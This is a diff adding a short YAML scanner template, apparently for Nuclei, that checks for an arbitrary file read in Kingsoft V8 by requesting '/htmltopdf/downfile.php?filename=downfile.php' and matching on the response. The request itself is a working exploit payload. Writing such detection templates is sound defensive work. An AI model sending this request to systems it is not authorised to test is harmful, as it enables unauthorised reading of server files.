@@ -1,0 +1,26 @@
+id: Kingsoft-V8-Arbitrary-file-read
+
+info:
+    name: Kingsoft-V8-Arbitrary-file-read
+    author: Master先生
+    tags: file-read
+    reference:
+      - https://www.freebuf.com/vuls/270683.html
+      - https://cn-sec.com/archives/342280.html
+    severity: high
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/htmltopdf/downfile.php?filename=downfile.php"
+    
+    redirects: false
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "contains(header, 'filename=downfile.php')"
+          - "contains(body, 'filename')"
+          - "status_code == 200"
